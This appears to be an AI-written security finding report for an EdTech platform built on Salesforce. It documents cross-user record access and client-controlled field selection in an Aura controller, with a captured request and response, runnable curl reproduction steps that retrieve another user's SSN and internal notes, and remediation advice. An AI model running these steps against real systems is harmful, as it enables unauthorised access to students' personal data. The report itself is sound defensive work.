# Security Analysis Report
**System:** LearnPath Assessment Platform (Education / EdTech LMS) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0016 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.12 | Mass assignment via `fields` parameter + `without sharing` — cross-user Task/assessment data accessed and field-harvested |

---

## Finding 1 — Mass Assignment via Client-Supplied `fields` Array + Missing Ownership Check (CRITICAL)

### Summary
The `TaskController` Apex class on LearnPath Assessment Platform (`8c7d3007.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Task objects. The `getTask` Aura action accepts both a `taskId` and a client-supplied `fields` array. An attacker can (a) substitute any `taskId` to access records belonging to other users, and (b) manipulate the `fields` array to retrieve additional sensitive fields beyond what the UI normally requests — this is mass assignment via object fields (Pattern 1.12). The combination exposes student assessment data, SSNs, and internal review notes.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://8c7d3007.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker with valid session):**
```
POST https://8c7d3007.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D8C7D3007!AR8c7d3007...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D8C7D3007!AR8c7d3007...

message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"0013007","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "0013007",
        "Name": "Victim Task Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-84-7983"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — no Aura session validation server-side.

The response leaks `SensitiveData__c: "SSN: 000-84-7983"` and `InternalNotes__c` for `OwnerId: "005VICTIM"`. The client-supplied `fields` parameter includes `InternalNotes__c` and `SensitiveData__c` — fields the server returns without restriction. In an EdTech LMS, Task objects contain student assessment records, grades, and personal data.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | OWD=Private for Task bypassed |
| §4.0 SOQL | `WHERE Id = :taskId` | No OwnerId predicate | Cross-user access root cause |
| §5.0 Pattern 1.12 | Vulnerability | Mass assignment via object fields | Classification — client controls field selection |
| §8.0 RISK-SF-016 | Known risk | `without sharing` | Confirmed architectural gap |
| §8.0 RISK-SF-017 | Known risk | No ownership check | Confirmed known gap |
| HAR descriptor | `c.TaskController.getTask` | Aura action | Vulnerable entry point |
| HAR params | `taskId` | `0013007` | Victim record ID |
| HAR params | `fields` | `["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]` | Client-controlled field list — mass assignment |
| HAR params | `aura.token` | `undefined` | Missing Aura validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim user — cross-user access confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-84-7983` | Student PII/SSN leaked |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Internal notes exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00D8C7D3007!AR8c7d3007..."
```

**Step 2 — Call Aura controller with victim's taskId and expanded fields (VULNERABLE):**
```bash
curl -s -X POST "https://8c7d3007.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"0013007","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-84-7983
```

**Step 3 — Extend mass assignment attack:**
```bash
# Add additional field names to the fields array to probe for other sensitive custom fields
# e.g., "fields": ["Id","Grade__c","Assessment__c","StudentId__c","SensitiveData__c"]
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class:**
   ```apex
   public with sharing class TaskController {
   ```
2. **Add ownership predicate to SOQL:**
   ```apex
   'WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()'
   ```
3. **Add `WITH SECURITY_ENFORCED`** to enforce field-level security.
4. **Remove client-supplied `fields` parameter:** Define allowed fields server-side in the Apex controller; do not allow the client to specify which fields to return. This eliminates the mass assignment vector:
   ```apex
   'SELECT Id, Name, OwnerId FROM Task WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId() WITH SECURITY_ENFORCED'
   ```
5. **Validate `aura.token`:** Reject all Aura requests with undefined or invalid tokens.
6. **FERPA compliance:** Student assessment data in EdTech is regulated under FERPA; ensure all Task-related data access is scoped to the authenticated student or their authorized instructor.
